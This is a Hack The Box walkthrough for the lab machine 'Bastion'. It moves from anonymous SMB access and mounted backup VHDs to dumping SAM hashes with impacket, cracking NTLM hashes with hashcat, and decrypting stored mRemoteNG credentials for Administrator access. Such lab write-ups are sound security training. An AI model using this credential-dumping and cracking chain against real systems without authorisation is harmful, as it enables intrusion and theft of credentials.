# Bastion HTB Walkthrough

## Target Information
- **IP Address**: 10.10.10.134
- **Hostname**: bastion.htb
- **OS**: Windows Server 2016 Standard 14393

---

## 🛠 Initial Setup & Reconnaissance

### 🎯 Environment Preparation
1. Store target IP for automation:
```bash
echo "10.10.10.134" > target
```

2. Add DNS resolution to hosts file:
```bash
echo "10.10.10.134 bastion.htb" | sudo tee -a /etc/hosts
```

---

## 🔍 Network Enumeration

### Port Discovery
Performed full TCP port scan:
```bash
nmap -p- -iL target -v -oN nmap/tcp_ports_scan.txt
```

**Findings**:
```
PORT      STATE SERVICE
22/tcp    open  ssh
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664-49670/tcp open  msrpc
```

### Service Enumeration
Aggressive scan on open ports:
```bash
ports=$(awk -F '/' 'NR>=6 && NR<=18 {print $1}' nmap/tcp_ports_scan.txt | paste -sd ',')
nmap -p$ports -sCV -oA nmap/service_scan -iL target
```

**Key Findings**:
- SMB (445/tcp): Windows Server 2016 Standard
- WinRM (5985/47001): Potential remote management access
- SSH (22/tcp): OpenSSH for Windows 7.9

---

## 📁 SMB Exploitation

### Share Enumeration
List available SMB shares:
```bash
smbclient -L \\\\bastion.htb\\ -N
```

**Discovered Shares**:
```
ADMIN$          - Remote Admin
Backups         - Potential backup storage
C$              - Default system share
IPC$            - Inter-process communication
```

![image](https://github.com/user-attachments/assets/ce65f502-3ed9-4113-bab3-5894284dfaca)

### Accessing Backups Share
Anonymous access to Backups share:
```bash
smbclient \\\\bastion.htb\\Backups -N
```

**Discovered Files**:
- 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd (System Boot)
- 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd (User Data)

### Mounting Virtual Hard Disks
1. Mount SMB share:
```bash
mkdir /mnt/backups
mount -t cifs //bastion.htb/Backups /mnt/backups -o ro,vers=2.1
```

3. Extract and mount VHD (if you got an error, try to list on it anyway):
```bash
mkdir /tmp/vhd
7z x /mnt/backups/9b9cfbc4-*.vhd -o/tmp/vhd
```

### Credential Extraction
Dump SAM database using Impacket:
```bash
impacket-secretsdump -sam /tmp/vhd/Windows/System32/config/SAM \
                     -system /tmp/vhd/Windows/System32/config/SYSTEM LOCAL
```

**Extracted Hashes**:
```
Administrator:500:aad3b... 
L4mpje:1000:aad3b... 
```

### Password Cracking
Crack NTLM hashes with Hashcat:
```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Initial Access

#### SSH Connection
Authenticate with obtained credentials:
```bash
ssh L4mpje@bastion.htb
```

You'll got the user flag.

## Resources

* This is another interesting way to mount vhd files: [Mounting VHD file on Kali Linux through remote share](https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25)

---

## ⚙️ Privilege Escalation

**mRemoteNG Credential Extraction**

1. Found [mRemoteNG](https://mremoteng.org/) installed in:
```shell
C:\Program Files (x86)\
```

![Screenshot from 2025-04-13 11-44-43](https://github.com/user-attachments/assets/2d9c9075-9bd5-45d9-b7d0-281d6aa26a2e)

2. Config file with saved credentials:
```shell
C:\Users\<User>\AppData\Roaming\mRemoteNG\confCons.xml
```

![Screenshot from 2025-04-13 11-45-57](https://github.com/user-attachments/assets/3b5cf8f9-6d7d-4336-bbce-cde11edeee8c)

3. Base64 encoded password was found in the file.

4. Decrypt password using the Python tool [mRemoteNG Decrypt](https://github.com/kmahyyg/mRemoteNG-Decrypt):

```bash
git clone https://github.com/kmahyyg/mremoteng-decrypt.git
cd mremoteng-decrypt
python3 mremoteng_decrypt.py -s <Base64 string>
```

5. Logged in as Administrator using decrypted credentials.

### Resources

* [mRemoteNG](https://mremoteng.org/)
* [GitHub - mRemoteNG](https://github.com/mRemoteNG/mRemoteNG)
* [GitHub - mRemoteNG Decrypt](https://github.com/kmahyyg/mRemoteNG-Decrypt)

---

## 🏁 Summary

* ✅ Initial access: SMB share > VHD > Password hash dump > SSH login
* 🔐 Privilege escalation: Extract mRemoteNG creds > Decrypt > Admin access

---
